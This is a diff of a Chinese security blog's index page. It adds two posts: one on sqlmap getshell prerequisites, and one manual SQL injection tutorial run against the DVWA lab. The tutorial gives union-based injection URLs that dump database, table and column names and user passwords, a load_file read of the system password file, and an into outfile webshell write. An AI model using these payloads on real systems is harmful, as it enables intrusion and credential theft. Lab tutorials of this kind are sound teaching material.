@@ -190,6 +190,426 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://anchorety.github.io/2020/01/20/sql注入——通过sqlmap进行getshell常见的问题/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="AnchoretY">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="AnchoretY's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/01/20/sql注入——通过sqlmap进行getshell常见的问题/" class="post-title-link" itemprop="url">sql注入——通过sqlmap进行getshell常见的问题</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-01-20 10:22:24" itemprop="dateCreated datePublished" datetime="2020-01-20T10:22:24+08:00">2020-01-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-02-19 12:05:32" itemprop="dateModified" datetime="2021-02-19T12:05:32+08:00">2021-02-19</time>
+              </span>
+
+          
+            <span id="/2020/01/20/sql注入——通过sqlmap进行getshell常见的问题/" class="post-meta-item leancloud_visitors" data-flag-title="sql注入——通过sqlmap进行getshell常见的问题" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2020/01/20/sql注入——通过sqlmap进行getshell常见的问题/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/01/20/sql注入——通过sqlmap进行getshell常见的问题/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>317</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>​    在上一篇文章中，我们提到了要使用sqlmap中自带的os-shell命令直接getshell要有下面四个先条件：</p>
+<blockquote>
+<p>1.当前注入点为root权限</p>
+<p>2.已知网站绝对路径</p>
+<p>3.php转义功能关闭</p>
+<p>4.secure_file_priv= 值为空</p>
+</blockquote>
+<p>在本文中将针对在实际环境中使用sqlmap进行getshell如何获取这些先决条件来进行详细介绍。</p>
+<h3 id="1-确认注入点权限"><a href="#1-确认注入点权限" class="headerlink" title="1.确认注入点权限"></a>1.确认注入点权限</h3><p>​    首先要确认注入点权限是否为root权限，可以直接使用sqlmap自带的测试命令is-dba</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u 网址 --is-dba</span><br></pre></td></tr></table></figure>
+<p><img src="https://github.com/AnchoretY/images/blob/master/blog/产看当前注入点是否为root权限结果.png?raw=true" alt></p>
+<h3 id="2-网站的绝对路径"><a href="#2-网站的绝对路径" class="headerlink" title="2.网站的绝对路径"></a>2.网站的绝对路径</h3><p>​    获取网站的绝对路径在可以先进入sql-shell:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u 网址 --sql-shell</span><br></pre></td></tr></table></figure>
+<p><img src="https://github.com/AnchoretY/images/blob/master/blog/进入sql-shell.png?raw=true" alt></p>
+<p>​    然后再在sql-shell中直接使用sql命令读取数据库文件存放路径：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sql-shell&gt; select @@datadir;</span><br></pre></td></tr></table></figure>
+<p><img src="https://github.com/AnchoretY/images/blob/master/blog/sql-shell获取绝对路径结果.png?raw=true" alt></p>
+<p>然后通过数据库文件的位置进行网站所在的绝对路径进行猜测。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://anchorety.github.io/2020/01/18/sql注入——手工注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="AnchoretY">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="AnchoretY's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/01/18/sql注入——手工注入/" class="post-title-link" itemprop="url">sql注入——手工注入</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-01-18 09:43:39" itemprop="dateCreated datePublished" datetime="2020-01-18T09:43:39+08:00">2020-01-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-02-19 12:05:32" itemprop="dateModified" datetime="2021-02-19T12:05:32+08:00">2021-02-19</time>
+              </span>
+
+          
+            <span id="/2020/01/18/sql注入——手工注入/" class="post-meta-item leancloud_visitors" data-flag-title="sql注入——手工注入" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2020/01/18/sql注入——手工注入/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/01/18/sql注入——手工注入/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>3.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>3 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>​    本文主要对手工方式sql注入进行介绍，包括sql注入的介绍和分类、sql注入中常用的关键字与敏感函数、经典的手工注入、利用sql注入进行文件的写入与读取等几部分。</p>
+<p>​    后续的sql注入系列文章还将对使用sqlmap进行sql注入以及进行sql注入过程常见的一些关键问题做阐述，可以参见后面的文章：</p>
+<ul>
+<li><a href>sql注入——sqlmap6步注入法</a></li>
+<li><a href>sql注入——通过sqlmap进行getshell常见的问题</a></li>
+</ul>
+<h3 id="sql注入介绍与分类"><a href="#sql注入介绍与分类" class="headerlink" title="sql注入介绍与分类"></a>sql注入介绍与分类</h3><p>​    </p>
+<pre class="mermaid">graph LR
+A(sql注入)  --> B(普通注入)
+A --> C(圆角长方形)
+C-->D(布尔型盲注)
+C-->E(延时盲注)</pre>
+
+<p>​    常见的sql注入主要分从注入结果的展现形式上分为普通注入和盲注两大类。最简单也是最常见的就是普通话的sql注入了，这种注入方式进行注入有直观展示的结果进行结果展示，一般可以直接使用union语句进行联合查询获取信息上传文件等操作，后续在<a href="#经典手工注入流程">经典手工注入流程</a>中讲述的就是使用普通注入进行sql注入。</p>
+<p><img src="https://github.com/AnchoretY/images/blob/master/blog/一般mysql.png?raw=true" alt></p>
+<p>​    另外一大类sql注入就是盲注，这种sql注入方式一般用于页面并没有对sql注入的查询结果直接进行返回，只能通过返回的一些其他信息判断注入的片段是否正确进行了执行。其中根据页面返回的布尔值(页面是否正确返回)进行sql注入称为<strong>布尔型盲注</strong>，根据页面返回时间的差异确定注入是否成功的sql注入称为<strong>延时盲注</strong>。下面是一个最常用延时注入的例子：</p>
+<p><img src="https://github.com/AnchoretY/images/blob/master/blog/延时注入.png?raw=true" alt></p>
+<p>在上面的例子中，再过个浏览器控制器的控制台中，可以看到该请求存在着10s左右的等待时间，也即是说明我们前面的进行拼遭的sql注入语句正确的进行了执行，因此可以判断该部分是一个可以进行利用的注入点。本文重点介绍一般的注入，关于盲注的具体使用将在后续的文章中进行介绍。</p>
+<h3 id="2-sql-注入中常用的关键字和系统表"><a href="#2-sql-注入中常用的关键字和系统表" class="headerlink" title="2.sql 注入中常用的关键字和系统表"></a>2.sql 注入中常用的关键字和系统表</h3><h4 id="sql注入中常用到的sql关键字"><a href="#sql注入中常用到的sql关键字" class="headerlink" title="sql注入中常用到的sql关键字"></a>sql注入中常用到的sql关键字</h4><div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:center">表达式</th>
+<th style="text-align:center">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">union</td>
+<td style="text-align:center">将查询结果进行联合输出，追加在列尾</td>
+</tr>
+<tr>
+<td style="text-align:center">union all</td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">load</td>
+<td style="text-align:center">文件读取</td>
+</tr>
+<tr>
+<td style="text-align:center">into outfile</td>
+<td style="text-align:center">文件写入</td>
+</tr>
+<tr>
+<td style="text-align:center">@@datadir</td>
+<td style="text-align:center">数据库文件存放路径</td>
+</tr>
+<tr>
+<td style="text-align:center">user()</td>
+<td style="text-align:center">当前用户</td>
+</tr>
+<tr>
+<td style="text-align:center">version()</td>
+<td style="text-align:center">数据库版本</td>
+</tr>
+<tr>
+<td style="text-align:center">database()</td>
+<td style="text-align:center">数据库名称</td>
+</tr>
+<tr>
+<td style="text-align:center">sleep(n)</td>
+<td style="text-align:center">延时执行n秒</td>
+</tr>
+</tbody>
+</table>
+</div>
+<blockquote>
+<p>@@表示系统变量</p>
+</blockquote>
+<h4 id="mysql中常用的系统表"><a href="#mysql中常用的系统表" class="headerlink" title="mysql中常用的系统表"></a>mysql中常用的系统表</h4><div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:center">数据库</th>
+<th style="text-align:center">表名</th>
+<th style="text-align:center">描述</th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">information_schema</td>
+<td style="text-align:center">tables</td>
+<td style="text-align:center">mysql中存储的全部表名，使用table_schema指定数据库名</td>
+<td>select table_schema.tables where table_scheama=数据库名</td>
+</tr>
+<tr>
+<td style="text-align:center">information_schema</td>
+<td style="text-align:center">columns</td>
+<td style="text-align:center">mysql中存储全部其他表的字段名，使用table_name指定表名</td>
+<td>select information_schema.columns where table_name=表名</td>
+</tr>
+</tbody>
+</table>
+</div>
+<blockquote>
+<p>Information_schema是mysql中自带的一个数据库，这个数据库中包含了其他数据的各种信息，包括数据库中的表名、权限、字段名等。</p>
+</blockquote>
+<h3 id="3-经典手工注入流程"><a href="#3-经典手工注入流程" class="headerlink" title="3.经典手工注入流程"></a>3.经典手工注入流程<div id="mark"></div></h3><h4 id="1-注入点测试"><a href="#1-注入点测试" class="headerlink" title="1.注入点测试"></a>1.注入点测试</h4><p>​    注入点测试主要分为<strong>是否存在sql注入检测</strong>与<strong>sql注入类型检测</strong>两个部分。<strong>要检测时候否存在sql注入</strong>只需要在要进行检测的参数后面加单引号，看是会因’个数不匹配而报错（这里的报错不一定是真的报错，可能只是页面不在正常显示之前的内容也可以看做报错的一种）。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/abc.php?id=1'</span><br></pre></td></tr></table></figure>
+<p>​    sql注入的注入点的类型主要分为数字型注入点和字符型注入点两种，分别对应着要进行sql注入的参数值在数据库中存储的类型是字符型还是数字型，直接影响到后面进行后续的注入的一些细节。</p>
+<h5 id="数字型检测"><a href="#数字型检测" class="headerlink" title="数字型检测"></a>数字型检测</h5><p>​    当输入变量的类型为数字类型时，可以使用and 1=1和and 1=2配合进行注入点类型进行检测:</p>
+<blockquote>
+<ol>
+<li>Url 地址中输入 <code>http://xxx/abc.php?id= x and 1=1</code> 页面依旧运行正常，继续进行下一步。</li>
+<li>Url 地址中继续输入 <code>http://xxx/abc.php?id= x and 1=2</code> 页面运行错误，则说明此 Sql 注入为数字型注入。</li>
+</ol>
+</blockquote>
+<p>原因为:</p>
+<blockquote>
+<p>如果当前注入点类型为数字型，    </p>
+<p>​    当输入 <code>and 1=1</code>时，后台执行 Sql 语句：<code>select * from &lt;表名&gt; where id = x and 1=1</code>,没有语法错误且逻辑判断为正确，所以返回正常。</p>
+<p>​    当输入 <code>and 1=2</code>时，后台执行 Sql 语句：<code>select * from &lt;表名&gt; where id = x and 1=2</code>,没有语法错误但是逻辑判断为假，所以返回错误。</p>
+<p>而如果该注入点类型为字符型，</p>
+<p>​    当输入<code>and 1=1</code>和 <code>and 1=2</code>时，后台执行sql语句：<code>select * from &lt;表名&gt; where id=&#39;x and 1=1&#39;</code>和 <code>select * from &lt;表名&gt; where id=&#39;x and 1=1</code>,将and语句作为字符进行id匹配，应该都没有查询结果，与事实不符因此该注入点为数字型注入点。</p>
+</blockquote>
+<h5 id="字符型注入点检测"><a href="#字符型注入点检测" class="headerlink" title="字符型注入点检测"></a>字符型注入点检测</h5><p>当输入变量为字符型时，可以使用’’ and ‘1’=’1和 ‘ and ‘1’=’2配合进行注入点类型检测：</p>
+<blockquote>
+<p>1.Url 地址中输入 <code>http://xxx/abc.php?id= x&#39; and &#39;1&#39;=&#39;1</code> 页面依旧运行正常，继续进行下一步。</p>
+<p>2.Url 地址中继续输入 <code>http://xxx/abc.php?id= x&#39; and &#39;1&#39;=&#39;2&#39;</code> 页面运行错误，则说明此 Sql 注入为数字型注入。</p>
+</blockquote>
+<p>原因与上面的数字型注入点检测原理类似，这里就不进行详细讲述了，感兴趣的读者可以自己尝试解释一下。</p>
+<h4 id="2-当前表行数测试"><a href="#2-当前表行数测试" class="headerlink" title="2.当前表行数测试"></a>2.当前表行数测试</h4><p>​    这里之所以要进行数据表行数测试是因为后面使用union进行联合查询时，明确后面要进行合并查询的列数。</p>
+<p>要进行列数测试要使用order by进行测试，不断增加后面的数字，直到出错为止。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/abc.php?id=x order by 8</span><br></pre></td></tr></table></figure>
+<p>下面为使用dvwa进行注入测试时的行数测试为例，当使用oder by 1和2时，页面正常显示</p>
+<p><img src="https://github.com/AnchoretY/images/blob/master/blog/列数测试.png?raw=true" alt></p>
+<p>当将数字升到3是，产生如下报错，因此我们可以知道该表中只有两行。</p>
+<p><img src="https://github.com/AnchoretY/images/blob/master/blog/列数测试2.png?raw=true" alt></p>
+<h4 id="3-测试当前表中那些列有回显"><a href="#3-测试当前表中那些列有回显" class="headerlink" title="3.测试当前表中那些列有回显"></a>3.测试当前表中那些列有回显</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># and 1=2为了不展示本改进心跳查询的内容，只展示union进行联合查询的内容</span><br><span class="line"># 最后的#是为了闭合本来sql语句中后面的‘</span><br><span class="line">http://xxx/abc.php?id=x and 1=2 union select 1,2#</span><br></pre></td></tr></table></figure>
+<p>这里dvwa表中本身就只有两列数据全部在前台进行显示</p>
+<p><img src="https://github.com/AnchoretY/images/blob/master/blog/展示列测试.png?raw=true" alt></p>
+<h4 id="4-查询数据库名称"><a href="#4-查询数据库名称" class="headerlink" title="4.查询数据库名称"></a>4.查询数据库名称</h4><p>​    查询当前数据库名称我们可以直接使用数据库内置函数database()进行获取，利用该函数进行当前数据库名称获取的典型注入代码如下所示:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 这里将database函数卸载第二个参数位置处，将在第二个参数展示的位置进行展示。也可以写在第一个参数位置</span><br><span class="line">http://xxx/abc.php?id=x and 1=2 union select 1,database()#</span><br></pre></td></tr></table></figure>
+<p>​    这里获取到了mysql中存在着名为dvwa的数据库</p>
+<p><img src="https://github.com/AnchoretY/images/blob/master/blog/手工注入-数据库名称获取.png?raw=true" alt></p>
+<h4 id="5-数据表名获取"><a href="#5-数据表名获取" class="headerlink" title="5.数据表名获取"></a>5.数据表名获取</h4><p>​     表名获取利用系统自带数据中（mysql中的information_schema）中的tables表中的内容进行获取。tables表中常用的字段如下表所示：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>数据表</th>
+<th>字段</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>tables</td>
+<td>table_schema</td>
+<td>字段所属的数据库名</td>
+</tr>
+<tr>
+<td>tables</td>
+<td>table_name</td>
+<td>字段所属的表名</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>​    使用下面的语句进行表名探索：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/abc.php?id=x and 1=2 union select 1,table_name from information_schema.tables where table_schema=&apos;dvwa&apos;#</span><br></pre></td></tr></table></figure>
+<p><img src="https://github.com/AnchoretY/images/blob/master/blog/手工注入-表名获取.png?raw=true" alt></p>
+<h4 id="6-字段获取"><a href="#6-字段获取" class="headerlink" title="6.字段获取"></a>6.字段获取</h4><p>​    字段获取利用系统自带的数据库（mysql中的information_schema）中的columns表中内容进行获取。columns表中常用字段如下表所示：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>数据表</th>
+<th>字段</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>columns</td>
+<td>table_schema</td>
+<td>字段所属的数据库名</td>
+</tr>
+<tr>
+<td>columns</td>
+<td>table_name</td>
+<td>字段所属的表名</td>
+</tr>
+<tr>
+<td>columns</td>
+<td>column_name</td>
+<td>字段名称</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>​    使用下面语完成对指定表中的字段名称进行探索：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/abc.php?id=x and 1=2 union select 1,column_name from information_schema.columns where table_schema=&apos;dvwa&apos; and table_name=&apos;users&apos;#</span><br></pre></td></tr></table></figure>
+<p><img src="https://github.com/AnchoretY/images/blob/master/blog/手工注入-表中列名获取.png?raw=true" alt></p>
+<p>​    从上面的例子中我们可以看到在users表中存在着User和Password两个字段保存着网站管理员的用户和密码，接下来就可以直接对这两列的内容进行获取了。</p>
+<h4 id="7-读取关键字段"><a href="#7-读取关键字段" class="headerlink" title="7.读取关键字段"></a>7.读取关键字段</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/abc.php?id=x and 1=2 union select user,password from dvwa.users #</span><br></pre></td></tr></table></figure>
+<p><img src="https://github.com/AnchoretY/images/blob/master/blog/手工注入——用户名密码获取.png?raw=true" alt></p>
+<h3 id="4-文件的写入读取"><a href="#4-文件的写入读取" class="headerlink" title="4.文件的写入读取"></a>4.文件的写入读取</h3><p>​    除了上面的基本的注入步骤外，找到注入点后还可以直接利用sql注入漏洞进行进一步的文件相关操作，可以直接通过sql注入实现对文件的读取与写入，利用文件的写入功能实现webshell的上传、系统用户名密码获取等功能。</p>
+<h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h4><p>​    在具有文件写入权限时常常可以直接使用进行文件读取，读取到文件后可以xxx</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=1&apos; and 1=2 union select laod_file(&apos;/etc/password&apos;) #</span><br></pre></td></tr></table></figure>
+<p><img src="https://github.com/AnchoretY/images/blob/master/blog/sqlmap文件读取.png?raw=true" alt></p>
+<h4 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h4><p>​    在具有文件写入权限时可以使用文件读取命令写入小马文件，获取shell。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=1 and 1=2 union select ’小马文件内容‘into outfile '文件目录+文件名'</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://anchorety.github.io/2020/01/17/sql注入——sqlmap6步注入法/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1171,222 +1591,6 @@
   
   
 
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://anchorety.github.io/2019/10/27/目标检测——ROI池化层/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="AnchoretY">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="AnchoretY's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2019/10/27/目标检测——ROI池化层/" class="post-title-link" itemprop="url">目标检测——ROI池化层</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2019-10-27 00:17:42" itemprop="dateCreated datePublished" datetime="2019-10-27T00:17:42+08:00">2019-10-27</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-02-19 12:05:32" itemprop="dateModified" datetime="2021-02-19T12:05:32+08:00">2021-02-19</time>
-              </span>
-
-          
-            <span id="/2019/10/27/目标检测——ROI池化层/" class="post-meta-item leancloud_visitors" data-flag-title="目标检测——ROI池化层" title="阅读次数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">阅读次数：</span>
-              <span class="leancloud-visitors-count"></span>
-            </span>
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="fa fa-comment-o"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2019/10/27/目标检测——ROI池化层/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2019/10/27/目标检测——ROI池化层/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>655</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>​    RoI概念来源于SPP Net网络，其主要用于改善在卷积神经网络一般都包含卷积部分和全连接部分两个部分，卷积神经网络部分输入不需要固定尺寸，而全连接层则需要固定输入尺寸，因此在卷积神经网络中由于卷积部分提取到到的特征向量要输入到全连接网络中，因此卷积网络部分的的输入也只能输入固定的尺寸，但是在一些环境中所能提供的输入并不是一定的，因此在SSP Net中提出了RoI结构用来解决这个问题。</p>
-<h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><blockquote>
-<p>​    加<strong>在卷积层后</strong>用来将卷积层输出的不同尺寸的向量固定成一个尺寸，使其可以在<strong>模型原始输入向量大小不同时可将卷及部分输出的向量统一规格输入到后续的全连接部分。</strong></p>
-</blockquote>
-<h4 id="具体结构"><a href="#具体结构" class="headerlink" title="具体结构"></a>具体结构</h4><p><img src="https://github.com/AnchoretY/images/blob/master/blog/ROI结构图.png?raw=true" alt></p>
-<blockquote>
-<p>假设输入ROI Pooling层的feature map of conv5的shape是(h,w,c)</p>
-<ol>
-<li>首先ROI Pooling层把feature map of conv5划分成4*4的小方块(对应图中蓝色矩形),每个小方块的宽高分别为w/4,h/4,通道数为c,不能整除时需要取整.针对feature map的每个通道,分别在这16个小方块进行最大池化(MaxPooling),也就是取出小方块里的最大值.每一个通道都能取出16个最大值,所以所有通道共有16c个值</li>
-<li>然后ROI Pooling层把feature map of conv5划分成2*2的小方块(对应图中绿色矩形),使用同样的方法得到4c个值</li>
-<li>接着ROI Pooling层把feature map of conv5划分成1*1的小方块(对应图中灰色矩形),得到c个值</li>
-<li>最后将上面三个值串联起来得到长度为16c+4c+c=21c的特征表示</li>
-</ol>
-</blockquote>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://anchorety.github.io/2019/10/26/目标检测——基本知识/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="AnchoretY">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="AnchoretY's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2019/10/26/目标检测——基本知识/" class="post-title-link" itemprop="url">目标检测——基本知识</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2019-10-26 17:45:19" itemprop="dateCreated datePublished" datetime="2019-10-26T17:45:19+08:00">2019-10-26</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-02-19 12:05:32" itemprop="dateModified" datetime="2021-02-19T12:05:32+08:00">2021-02-19</time>
-              </span>
-
-          
-            <span id="/2019/10/26/目标检测——基本知识/" class="post-meta-item leancloud_visitors" data-flag-title="目标检测——基本知识" title="阅读次数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">阅读次数：</span>
-              <span class="leancloud-visitors-count"></span>
-            </span>
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="fa fa-comment-o"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2019/10/26/目标检测——基本知识/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2019/10/26/目标检测——基本知识/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>72</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h4 id="1-什么是IoU-intersection-over-union-？"><a href="#1-什么是IoU-intersection-over-union-？" class="headerlink" title="1.什么是IoU(intersection-over-union)？"></a>1.什么是IoU(intersection-over-union)？</h4><blockquote>
-<p>IoU简单来讲就是模型产生的目标窗口和原来标记窗口的交叠率。具体计算公式为：</p>
-<p><img src="https://github.com/AnchoretY/images/blob/master/blog/IoU.png?raw=true" alt></p>
-</blockquote>
-
-      
